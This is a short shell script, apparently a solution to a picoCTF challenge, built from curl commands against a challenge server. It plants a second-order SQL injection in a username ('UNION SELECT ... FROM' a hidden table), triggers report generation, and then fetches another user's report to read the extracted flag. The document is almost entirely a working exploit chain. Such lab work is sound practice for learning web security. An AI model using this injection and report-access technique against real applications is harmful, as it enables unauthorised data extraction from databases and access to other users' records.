PORT=61716; BASE="http://crystal-peak.picoctf.net:$PORT"

# Step 1: Create clean user and generate report ID 1
curl -sc c.txt -X POST -d "username=c1&password=p&email=c1@x.com" $BASE/signup > /dev/null
curl -sb c.txt -c c.txt -X POST -d "username=c1&password=p" $BASE/login > /dev/null
curl -sb c.txt -X POST -d "description=x&amount=1&date=2026-03-10" $BASE/expenses > /dev/null
curl -sb c.txt -X POST -H "Referer: $BASE/expenses" $BASE/generate_report > /dev/null
echo "Waiting for report 1..."
sleep 15

# Step 2: Create SQL injection user to get flag
curl -sc fl.txt -X POST -d "username=fl' UNION SELECT value,1.0,'2026-01-01' FROM aDNyM19uMF9mMTRn--&password=p&email=fl@x.com" $BASE/signup > /dev/null
curl -sb fl.txt -c fl.txt -X POST -d "username=fl' UNION SELECT value,1.0,'2026-01-01' FROM aDNyM19uMF9mMTRn--&password=p" $BASE/login > /dev/null
curl -sb fl.txt -X POST -d "description=x&amount=1&date=2026-03-10" $BASE/expenses > /dev/null
curl -sb fl.txt -X POST -H "Referer: $BASE/expenses" $BASE/generate_report > /dev/null
echo "Waiting for report 2..."
sleep 15

# Step 3: Download the flag report
curl -sb c.txt $BASE/report/2